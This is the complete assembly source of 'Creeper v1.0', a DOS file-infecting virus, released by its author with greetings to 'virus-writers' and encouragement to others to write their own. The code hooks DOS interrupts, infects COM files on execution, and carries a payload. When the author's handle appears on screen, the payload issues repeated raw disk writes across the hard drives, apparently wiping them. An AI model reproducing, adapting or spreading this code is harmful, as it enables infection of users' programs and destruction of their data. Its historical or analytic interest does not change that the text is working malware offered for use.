;
;	Demoralized Youth proudly presents:	Creeper v1.0, Original Source
;
;			Written by:	TORMENTOR	
; 
;	Yez, here it is... It's not like 4096 or Pogue, but it's a virus!
;	The reason why I release the original source is that I think I
;	can't do much more on this virus... I will start from scratch 
;	and write a larger and more smarter EXE-virus...
;	And if I release this source maybe YOU will get some god ideas and
;	write your own virus (or rewrite this!)...
;	And if you do, Great! Feel free to mix with it as much as you want
;	but please don't change this file!
;	Well, go on and write virus! The world is to safe!
;	
;
;	Regards / TORMENTOR
;

code		segment	byte public
		assume	cs:code, ds:code, es:code, ss:code
  
  
		org	100h
  
  
codebeg:
  

		mov	ax,043FFh		; Remove virus from code!
		int	21h

; Let's allocate some mem!

		mov	ax,ds
		sub	ax,11h
		mov	ds,ax
		cmp	byte ptr ds:[0100h],5Ah
		jnz	skip
		mov	ax,ds:[0103h]
		sub	ax,40h
		jb	skip
		mov	ds:[0103h],ax
		sub	word ptr ds:[0112h],50h
		mov	es,ds:[0112h]
		push	cs
		pop	ds
		mov	cx,code_end-codebeg
		mov	di,100h
		push	di
		mov	si,di
		rep	movsb

		push 	es
		pop	ds

		mov	ax,351Ch
		int	21h
		mov	word ptr ds:[int1Cret],bx
		mov	word ptr ds:[int1Cret+2],es
		mov	al,21h
		int	21h
		mov	word ptr ds:[real21+1],bx
		mov	word ptr ds:[real21+3],es
		
		mov	ah,25h
		mov	dx,offset int21beg
		int	21h
		mov	al,1Ch
		mov	dx,offset int1Cnew
		int	21h
	
		push	cs
		push	cs
		pop	es
		pop	ds
	
		ret

skip:		int	20h		
		

int21beg:	push	ax
		sub	ax,4B00h
		jz	infect
		pop	ax
		cmp	ax,043FFh		; Check if Harakiri.		
		jne	real21
		
		mov	ax,word ptr ds:[retdata]
		mov	si,ax
		mov	di,100h
		mov	cx,code_end-codebeg
		rep	movsb

		mov	ax,100h
	
		pop	cx
		pop	cx
		push	es
		push	ax
		iret

real21:		db	0EAh, 00h, 00h, 00h, 00h	; Jump to org21vec.


retdata:	db	00h, 00h

f_time:		dw	0000h

f_date:		dw	0000h	

infect:		pop	ax

		push	ax
		push	bx
		push	cx
		push	di
		push	ds
		push	dx
		push	si		

	
		mov	ah,43h			; Get file attr.
		int	21h
		mov	ax,4301h
		and	cx,0FEh			; Strip the Read-only-flag
		int	21h

		mov	ax,3D02h		; Open victim.
		int	21h

		xchg	ax,bx

		call	sub_2  

sub_2:		mov	di,sp			; God what I hate that Eskimo!
		mov 	si,ss:[di]
		inc	sp
		inc	sp

		push	cs
		pop	ds

		mov	ax,5700h		; Get file's time and date
		int	21h
		mov	[si-(sub_2-f_time)],cx	
		mov	[si-(sub_2-f_date)],dx	; And save them...

		mov	ah,3Fh			; Read X byte from begin.
		mov	cx,code_end-codebeg
		add	si,code_end-sub_2	; SI points to EOF	
		mov	dx,si
		int	21h			

		
		cmp	word ptr [si],'MZ'	; Mark Zimbowski?
		je	close
		cmp	word ptr [si],'ZM'	; Zimbowski Mark?
		je 	close	
mark:		cmp	word ptr [si+(mark-codebeg+4)],'YD'	; infected?
		je	close

		call	put_eof			; move file ptr to EOF

		cmp	ax,(0FFFFh-(code_end-codebeg)-100h)
		ja	close
		cmp	ax,code_end-codebeg+100h
		jb	close

		add	ax,100h
		mov	word ptr ds:[si-(code_end-retdata)],ax	

		mov	ah,40h			; Flytta beg to end.
		mov	cx,code_end-codebeg
		mov	dx,si
		int	21h
		
		mov	ax,4200h		; fptr to filbeg.
		xor 	cx,cx
		xor 	dx,dx
		int	21h
	
		mov	ah,40h			; Write virus to beg.
		mov	cx,code_end-codebeg
		mov	dx,si
		sub	dx,cx
		int	21h

close:		mov	ax,5701h
		mov	cx,[si-(code_end-f_time)]
		mov	dx,[si-(code_end-f_date)]
		int	21h

		mov	ah,3Eh			
		int	21h			; close file, bx=file handle

		pop	si
		pop	dx
		pop	ds
		pop	di
		pop	cx
		pop	bx
		pop	ax

		
		jmp	real21

put_eof:	mov 	ax,4202h
		xor	dx,dx
		xor	cx,cx
		int 	21h
		ret


int1Cnew:	

		push 	ax
		inc 	byte ptr cs:[counter]
		mov 	al,30h
		cmp 	byte ptr cs:[counter],al
		jz 	scan
		pop 	ax


slut:		jmp 	dword ptr cs:[int1Cret]

scan:   	
		push 	bx
		push 	cx
		push 	di
		push	ds
		push	dx
		push	es
		push	si


		push 	cs
		pop 	ds

		cld
		xor 	bx,bx
		mov 	byte ptr cs:[counter],bh
		mov 	cx,0FA0h

		mov 	ax,0b800h
		mov 	es,ax
		xor 	di,di

again:		mov 	al,byte ptr cs:[text+bx]
		sub	al,80h
		repnz 	scasb	
		jnz 	stick

maybe:		inc 	di
		inc 	bx
		cmp 	bx,10d
		jz	beep

		mov	al,byte ptr cs:[text+bx]
		sub	al,80h
		scasb
		jz	maybe
		xor	bx,bx
		jmp	again

beep:		
		xor	cx,cx
		mov	bx,word ptr cs:[int1Cret]
		mov	es,word ptr cs:[int1Cret+2]
		mov	ax,251Ch
		int	21h

overagain:	mov	dx,0180h
		xor	bx,bx

reset:		mov	ah,00h
		inc	bx
		cmp	bl,5h
		jz	raise		
		inc	cx
		int	13h

hoho:		mov	ax,0380h
		inc	cx
		int	13h
		jc	reset
		jmp 	hoho		

raise:		xor	cx,cx
		xor	bx,bx
		inc	dx
		cmp	dl,85h
		jnz	hoho
		jmp	overagain	
					
stick:
		pop	si		
		pop	es
		pop	dx
		pop 	ds
		pop 	di
		pop 	cx
		pop 	bx 		
		pop 	ax


		jmp 	slut


counter:	db 	00h

text:	 	db 	'T'+80h, 'O'+80h, 'R'+80h, 'M'+80h, 'E'+80h, 'N'+80h
		db	'T'+80h, 'O'+80h, 'R'+80h, '!'+80h

			; This is what it scans the screen for --^

int1Cret:	db	0EAh, 00h, 00h, 00h, 00h

code_end:					; THE END.

code		ends
end		codebeg

;
;  Greetings to: Charlie, HITMAN, Wiper, Torpedo, Tortuer, WiCO, Drive Screwer
;  And ALL other virus-writers!  
;
